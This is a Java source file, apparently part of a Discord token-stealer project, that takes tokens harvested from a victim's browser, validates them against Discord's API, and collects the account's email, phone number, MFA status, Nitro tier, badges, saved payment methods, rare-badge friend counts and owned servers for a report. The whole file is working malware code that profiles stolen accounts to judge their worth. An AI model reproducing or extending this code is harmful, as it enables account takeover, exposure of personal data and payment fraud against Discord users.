package itzgonza.hollyshit.impl.app;

import java.util.ArrayList;
import java.util.List;

import com.github.kevinsawicki.http.HttpRequest;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import itzgonza.hollyshit.impl.browser.DiscordToken;
import itzgonza.hollyshit.utils.utilities;

public class DiscordApp extends utilities {

    public static List<String> owner_servers = new ArrayList<>(), gifts = new ArrayList<>();
    public static String token, username, discriminator, id, avatar, email, phone, nitroType, cardemogies, date, badges;
    public static int flag, premium_type, friendsCount, hqFriendsCount;
    public static boolean check = true, mfa = false;

    private static List<String> foundTokens = new ArrayList<>();

    public void initialize() {
        try {
            // DiscordToken already runs in startup.java or we can call it here if needed
            // But we'll just wait for its tokens
            List<String> allTokens = new ArrayList<>(DiscordToken.tokens);
            
            for (String tkn : allTokens) {
                if (foundTokens.contains(tkn)) continue;
                foundTokens.add(tkn);
                
                try {
                    String valid = HttpRequest.get("https://discord.com/api/v9/users/@me")
                            .userAgent("Mozilla/5.0")
                            .authorization(tkn)
                            .body();
                            
                    if (valid.contains("Unauthorized")) continue;
                    
                    token = tkn;
                    JsonObject userObj = JsonParser.parseString(valid).getAsJsonObject();
                    username = getStringFromJson(userObj, "username");
                    discriminator = getStringFromJson(userObj, "discriminator");
                    id = getStringFromJson(userObj, "id");
                    avatar = getStringFromJson(userObj, "avatar");
                    email = getStringFromJson(userObj, "email");
                    phone = getStringFromJson(userObj, "phone");
                    mfa = userObj.has("mfa_enabled") && userObj.get("mfa_enabled").getAsBoolean();
                    flag = getIntFromJson(userObj, "flags");
                    premium_type = getIntFromJson(userObj, "premium_type");
                    
                    // Nitro type
                    nitroType = "None";
                    if (premium_type == 1) nitroType = "Nitro Classic";
                    else if (premium_type == 2) nitroType = "Nitro Boost";
                    else if (premium_type == 3) nitroType = "Nitro Basic";
                    
                    // Badges
                    badges = utilities.getBadges(flag, true);

                    // Billing info
                    String billing = HttpRequest.get("https://discord.com/api/v9/users/@me/billing/payment-sources")
                            .userAgent("Mozilla/5.0")
                            .authorization(tkn)
                            .body();
                    if (billing.contains("brand")) {
                        List<String> types = new ArrayList<>();
                        if (billing.contains("visa")) types.add("💳 Visa");
                        if (billing.contains("mastercard")) types.add("💳 Mastercard");
                        if (billing.contains("paypal")) types.add("💸 PayPal");
                        if (types.isEmpty()) types.add("💳 Yes");
                        cardemogies = String.join(", ", types);
                    } else {
                        cardemogies = "None";
                    }

                    // Friends & Relationships
                    try {
                        String relationships = HttpRequest.get("https://discord.com/api/v9/users/@me/relationships")
                                .userAgent("Mozilla/5.0")
                                .authorization(tkn)
                                .body();
                        if (relationships.startsWith("[")) {
                            com.google.gson.JsonArray relArr = JsonParser.parseString(relationships).getAsJsonArray();
                            friendsCount = relArr.size();
                            hqFriendsCount = 0;
                            // Rare flags: 1 (Staff), 2 (Partner), 4 (HypeEvents), 8 (BugHunter1), 512 (EarlySupporter), 16384 (BugHunter2), 131072 (VerifiedDev)
                            int[] rareFlags = {1, 2, 4, 8, 512, 16384, 131072};
                            for (com.google.gson.JsonElement el : relArr) {
                                JsonObject r = el.getAsJsonObject();
                                if (r.has("user")) {
                                    JsonObject u = r.getAsJsonObject("user");
                                    int f = u.has("public_flags") ? u.get("public_flags").getAsInt() : 0;
                                    for (int rf : rareFlags) {
                                        if ((f & rf) != 0) {
                                            hqFriendsCount++;
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    } catch (Exception ignored) {}

                    // Guilds (Owner check)
                    String guilds = HttpRequest.get("https://discord.com/api/v9/users/@me/guilds")
                            .userAgent("Mozilla/5.0")
                            .authorization(tkn)
                            .body();
                    if (guilds != null && guilds.startsWith("[")) {
                        com.google.gson.JsonArray guildArr = JsonParser.parseString(guilds).getAsJsonArray();
                        for (com.google.gson.JsonElement el : guildArr) {
                            JsonObject g = el.getAsJsonObject();
                            if (g.has("owner") && g.get("owner").getAsBoolean()) {
                                owner_servers.add(g.get("name").getAsString());
                            }
                        }
                    }

                    break; // Just one valid token for the main report
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
    }

    public static String getStringFromJson(JsonObject object, String key) {
        return object.has(key) && !object.get(key).isJsonNull() ? object.get(key).getAsString() : "none";
    }
    
    public static int getIntFromJson(JsonObject object, String key) {
        return object.has(key) && !object.get(key).isJsonNull() ? object.get(key).getAsInt() : 0;
    }
}